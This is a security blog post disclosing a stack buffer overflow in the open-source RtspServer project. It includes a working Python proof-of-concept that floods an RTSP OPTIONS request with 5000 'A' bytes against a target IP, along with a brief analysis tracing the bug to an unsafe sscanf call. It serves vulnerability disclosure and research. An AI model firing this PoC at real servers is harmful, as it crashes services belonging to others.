
[# hu1y40's blog](http://www.huiyao.love)

hu1y40'blog天堂的穹空遍布地狱之火的颜色，但也是天堂。

1. [首页](http://www.huiyao.love)
2. [漏洞分析](http://www.huiyao.love/category/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/)
3. [二进制](http://www.huiyao.love/category/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/%E4%BA%8C%E8%BF%9B%E5%88%B6/)
4. [DoS](http://www.huiyao.love/category/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/%E4%BA%8C%E8%BF%9B%E5%88%B6/dos-%E4%BA%8C%E8%BF%9B%E5%88%B6/)
5. 正文

# RTSPServer StackOverflow Vulnerability

2023年12月8日
14259点热度
0人点赞
0条评论

# RTSPServer StackOverflow Vulnerability

## 0x00 Introduction

Project URL：<https://github.com/PHZ76/RtspServer>

## 0x01 PoC

### 1.1 PoC

import socket

def send\_rtsp\_options\_request(server\_ip, server\_port, rtsp\_path):

# make RTSP OPTIONS request

d = "4f5054494f4e53202f2e3a2f"+"41"\*5000+"00003a2f2f3132372e302e302e313a3535342f6c69766520525453502f312e300d0a435365713a20310d0a557365722d4167656e743a2066757a7a0d0a0d0a"

rtsp\_options\_request = bytes.fromhex(d)

# create TCP socket

with socket.socket(socket.AF\_INET, socket.SOCK\_STREAM) as s:

s.connect((server\_ip, server\_port))

# send RTSP OPTIONS reqeust

s.sendall(rtsp\_options\_request)

# get response

response = s.recv(1024)

print(response.decode())

if \_\_name\_\_ == "\_\_main\_\_":

server\_ip = "192.168.175.136"

server\_port = 554

rtsp\_path = "/example.sdp"

send\_rtsp\_options\_request(server\_ip, server\_port, rtsp\_path)

Need to change server\_ip to the IP address of the target machine.

### 1.2 build and start server

git clone https://github.com/PHZ76/RtspServer.git

cd RtspServer

make

sudo ./rtsp\_h264\_file ./test.h264

## 0x02 Analyze

The vulnerability is located RtspMesaage.cpp:64.

The message variable is controllable by the attacker, and the format parameter of sscanf is not secure.

![fig:](http://www.huiyao.love/wp-content/uploads/2023/12/fig-14.png)

![fig:](http://www.huiyao.love/wp-content/uploads/2023/12/fig-15.png)

Doing stack backtracking, it was found that the stack has been overwritten by 0x41414141

![fig:](http://www.huiyao.love/wp-content/uploads/2023/12/fig-16.png)

标签：
[漏洞](http://www.huiyao.love/tag/%E6%BC%8F%E6%B4%9E/)
最后更新：2023年12月16日

![](https://sdn.geekzu.org/avatar/a927c08b79e40b428d1a80a9dd0d8f38?s=96&d=mm&r=g)

hu1y40

这个人很懒，什么都没留下

点赞

[< 上一篇](http://www.huiyao.love/2023/12/01/mp4box-%E6%97%A0%E9%99%90%E5%BE%AA%E7%8E%AF%E6%BC%8F%E6%B4%9E/ "MP4Box 无限循环漏洞")
### 文章评论

![razz](http://www.huiyao.love/wp-content/themes/kratos-4.2.4/assets/img/smilies/razz.png)
![evil](http://www.huiyao.love/wp-content/themes/kratos-4.2.4/assets/img/smilies/evil.png)
![exclaim](http://www.huiyao.love/wp-content/themes/kratos-4.2.4/assets/img/smilies/exclaim.png)
![smile](http://www.huiyao.love/wp-content/themes/kratos-4.2.4/assets/img/smilies/smile.png)
![redface](http://www.huiyao.love/wp-content/themes/kratos-4.2.4/assets/img/smilies/redface.png)
![biggrin](http://www.huiyao.love/wp-content/themes/kratos-4.2.4/assets/img/smilies/biggrin.png)
![eek](http://www.huiyao.love/wp-content/themes/kratos-4.2.4/assets/img/smilies/eek.png)
![confused](http://www.huiyao.love/wp-content/themes/kratos-4.2.4/assets/img/smilies/confused.png)
![idea](http://www.huiyao.love/wp-content/themes/kratos-4.2.4/assets/img/smilies/idea.png)
![lol](http://www.huiyao.love/wp-content/themes/kratos-4.2.4/assets/img/smilies/lol.png)
![mad](http://www.huiyao.love/wp-content/themes/kratos-4.2.4/assets/img/smilies/mad.png)
![twisted](http://www.huiyao.love/wp-content/themes/kratos-4.2.4/assets/img/smilies/twisted.png)
![rolleyes](http://www.huiyao.love/wp-content/themes/kratos-4.2.4/assets/img/smilies/rolleyes.png)
![wink](http://www.huiyao.love/wp-content/themes/kratos-4.2.4/assets/img/smilies/wink.png)
![cool](http://www.huiyao.love/wp-content/themes/kratos-4.2.4/assets/img/smilies/cool.png)
![arrow](http://www.huiyao.love/wp-content/themes/kratos-4.2.4/assets/img/smilies/arrow.png)
![neutral](http://www.huiyao.love/wp-content/themes/kratos-4.2.4/assets/img/smilies/neutral.png)
![cry](http://www.huiyao.love/wp-content/themes/kratos-4.2.4/assets/img/smilies/cry.png)
![mrgreen](http://www.huiyao.love/wp-content/themes/kratos-4.2.4/assets/img/smilies/mrgreen.png)
![drooling](http://www.huiyao.love/wp-content/themes/kratos-4.2.4/assets/img/smilies/drooling.png)
![persevering](http://www.huiyao.love/wp-content/themes/kratos-4.2.4/assets/img/smilies/persevering.png)

[取消回复](/2023/12/08/rtspserver-stackoverflow-vulnerability/#respond)

文章目录

* [RTSPServer StackOverflow Vulnerability](#toc-1)
  + [0x00 Introduction](#toc-2)
  + [0x01 PoC](#toc-3)
    - [1.1 PoC](#toc-4)
    - [1.2 build and start server](#toc-5)
  + [0x02 Analyze](#toc-6)

## 分类目录

* [0day安全](http://www.huiyao.love/category/%E4%B9%A6%E7%B1%8D%E9%98%85%E8%AF%BB/0day%E5%AE%89%E5%85%A8/)
* [Bypass](http://www.huiyao.love/category/bypass/)
* [C++Prime](http://www.huiyao.love/category/%E4%B9%A6%E7%B1%8D%E9%98%85%E8%AF%BB/cprime/)
* [CTF](http://www.huiyao.love/category/ctf/)
* [DoS](http://www.huiyao.love/category/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/%E4%BA%8C%E8%BF%9B%E5%88%B6/dos-%E4%BA%8C%E8%BF%9B%E5%88%B6/)
* [DoS](http://www.huiyao.love/category/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/web/dos/)
* [FUZZ](http://www.huiyao.love/category/fuzz/)
* [iot](http://www.huiyao.love/category/iot/)
* [JSONP](http://www.huiyao.love/category/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/web/jsonp/)
* [MISC](http://www.huiyao.love/category/ctf/misc/)
* [MISC](http://www.huiyao.love/category/misc-2/)
* [PHP伪协议](http://www.huiyao.love/category/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/web/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/)
* [Python](http://www.huiyao.love/category/python/)
* [REVERSE](http://www.huiyao.love/category/ctf/reverse/)
* [sqli-labs](http://www.huiyao.love/category/%E9%9D%B6%E5%9C%BA/sqli-labs/)
* [SQL注入](http://www.huiyao.love/category/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/web/sql%E6%B3%A8%E5%85%A5/)
* [Trick](http://www.huiyao.love/category/trick/)
* [UAF](http://www.huiyao.love/category/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/%E4%BA%8C%E8%BF%9B%E5%88%B6/uaf/)
* [WEB](http://www.huiyao.love/category/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/web/)
* [WEB](http://www.huiyao.love/category/trick/web-trick/)
* [XXE](http://www.huiyao.love/category/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/web/xxe/)
* [书籍阅读](http://www.huiyao.love/category/%E4%B9%A6%E7%B1%8D%E9%98%85%E8%AF%BB/)
* [二进制](http://www.huiyao.love/category/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/%E4%BA%8C%E8%BF%9B%E5%88%B6/)
* [代码阅读](http://www.huiyao.love/category/%E4%BB%A3%E7%A0%81%E9%98%85%E8%AF%BB/)
* [信息搜集](http://www.huiyao.love/category/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/)
* [信息泄露](http://www.huiyao.love/category/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/%E4%BA%8C%E8%BF%9B%E5%88%B6/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/)
* [加密与解密](http://www.huiyao.love/category/%E4%B9%A6%E7%B1%8D%E9%98%85%E8%AF%BB/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86/)
* [双重释放漏洞](http://www.huiyao.love/category/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/%E4%BA%8C%E8%BF%9B%E5%88%B6/%E5%8F%8C%E9%87%8D%E9%87%8A%E6%94%BE%E6%BC%8F%E6%B4%9E/)
* [反序列化](http://www.huiyao.love/category/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/web/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/)
* [命令执行](http://www.huiyao.love/category/iot/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-iot/)
* [命令执行](http://www.huiyao.love/category/bypass/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/)
* [堆溢出](http://www.huiyao.love/category/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/%E4%BA%8C%E8%BF%9B%E5%88%B6/%E5%A0%86%E6%BA%A2%E5%87%BA/)
* [密码学](http://www.huiyao.love/category/%E5%AF%86%E7%A0%81%E5%AD%A6/)
* [弱加密](http://www.huiyao.love/category/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/web/%E5%BC%B1%E5%8A%A0%E5%AF%86/)
* [提权漏洞](http://www.huiyao.love/category/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/%E4%BA%8C%E8%BF%9B%E5%88%B6/%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/)
* [整数溢出](http://www.huiyao.love/category/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/%E4%BA%8C%E8%BF%9B%E5%88%B6/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/)
* [文件上传](http://www.huiyao.love/category/%E9%9D%B6%E5%9C%BA/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/)
* [未分类](http://www.huiyao.love/category/uncategorized/)
* [栈溢出](http://www.huiyao.love/category/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/%E4%BA%8C%E8%BF%9B%E5%88%B6/%E6%A0%88%E6%BA%A2%E5%87%BA/)
* [格式化字符串漏洞](http://www.huiyao.love/category/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/%E4%BA%8C%E8%BF%9B%E5%88%B6/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/)
* [模型](http://www.huiyao.love/category/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%A8%A1%E5%9E%8B/)
* [汇编语言](http://www.huiyao.love/category/%E4%B9%A6%E7%B1%8D%E9%98%85%E8%AF%BB/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/)
* [渗透测试](http://www.huiyao.love/category/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/)
* [漏洞分析](http://www.huiyao.love/category/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/)
* [漏洞利用](http://www.huiyao.love/category/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/)
* [漏洞战争](http://www.huiyao.love/category/%E4%B9%A6%E7%B1%8D%E9%98%85%E8%AF%BB/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89/)
* [漏洞挖掘](http://www.huiyao.love/category/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/)
* [病毒分析](http://www.huiyao.love/category/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/)
* [越界读取](http://www.huiyao.love/category/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/%E4%BA%8C%E8%BF%9B%E5%88%B6/%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%8F%96/)
* [路径遍历](http://www.huiyao.love/category/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/web/%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86/)
* [逻辑漏洞](http://www.huiyao.love/category/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/)
* [配置不当](http://www.huiyao.love/category/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/web/%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93/)
* [钓鱼](http://www.huiyao.love/category/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E9%92%93%E9%B1%BC/)
* [靶场](http://www.huiyao.love/category/%E9%9D%B6%E5%9C%BA/)

[最新](#nav-new)
[热点](#nav-hot)
[随机](#nav-random)

[最新](#nav-new)
[热点](#nav-hot)
[随机](#nav-random)

[2023年度总结](http://www.huiyao.love/2024/01/02/2023%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/ "2023年度总结")
[RTSPServer StackOverflow Vulnerability](http://www.huiyao.love/2023/12/08/rtspserver-stackoverflow-vulnerability/ "RTSPServer StackOverflow Vulnerability")
[FUZZ 总览篇](http://www.huiyao.love/2023/12/05/fuzz-%E6%80%BB%E8%A7%88%E7%AF%87/ "FUZZ 总览篇")
[MP4Box 无限循环漏洞](http://www.huiyao.love/2023/12/01/mp4box-%E6%97%A0%E9%99%90%E5%BE%AA%E7%8E%AF%E6%BC%8F%E6%B4%9E/ "MP4Box 无限循环漏洞")
[CVE-2023-40477 Winrar RCE漏洞分析](http://www.huiyao.love/2023/11/30/cve-2023-40477-winrar-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/ "CVE-2023-40477 Winrar RCE漏洞分析")
[工商银行美国子公司遭LockBit勒索攻击](http://www.huiyao.love/2023/11/30/%E5%B7%A5%E5%95%86%E9%93%B6%E8%A1%8C%E7%BE%8E%E5%9B%BD%E5%AD%90%E5%85%AC%E5%8F%B8%E9%81%ADlockbit%E5%8B%92%E7%B4%A2%E6%94%BB%E5%87%BB/ "工商银行美国子公司遭LockBit勒索攻击")

[CVE-2010-3333 Microsoft Office RTF栈溢出漏洞](http://www.huiyao.love/2023/10/07/cve-2010-3333-microsoft-office-rtf%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/ "CVE-2010-3333 Microsoft Office RTF栈溢出漏洞")
[bugku 闪的好快](http://www.huiyao.love/2023/10/07/bugku-%E9%97%AA%E7%9A%84%E5%A5%BD%E5%BF%AB/ "bugku 闪的好快")
[Fuzzing101 4~6](http://www.huiyao.love/2023/10/07/fuzzing101-46/ "Fuzzing101 4~6")
[sqli-labs 11-20](http://www.huiyao.love/2023/10/07/sqli-labs-11-20/ "sqli-labs 11-20")
[CVE-2010-3974 fxscover双重释放漏洞](http://www.huiyao.love/2023/10/07/cve-2010-3974-fxscover%E5%8F%8C%E9%87%8D%E9%87%8A%E6%94%BE%E6%BC%8F%E6%B4%9E/ "CVE-2010-3974 fxscover双重释放漏洞")
[libpcap库及其C语言调用](http://www.huiyao.love/2023/10/07/libpcap%E5%BA%93%E5%8F%8A%E5%85%B6c%E8%AF%AD%E8%A8%80%E8%B0%83%E7%94%A8/ "libpcap库及其C语言调用")

COPYRIGHT © 2023 hu1y40's blog. ALL RIGHTS RESERVED.

Theme [Kratos](https://github.com/seatonjiang/kratos) Made By [Seaton Jiang](https://seatonjiang.com)

[鄂ICP备2021009673号-1](https://beian.miit.gov.cn/)

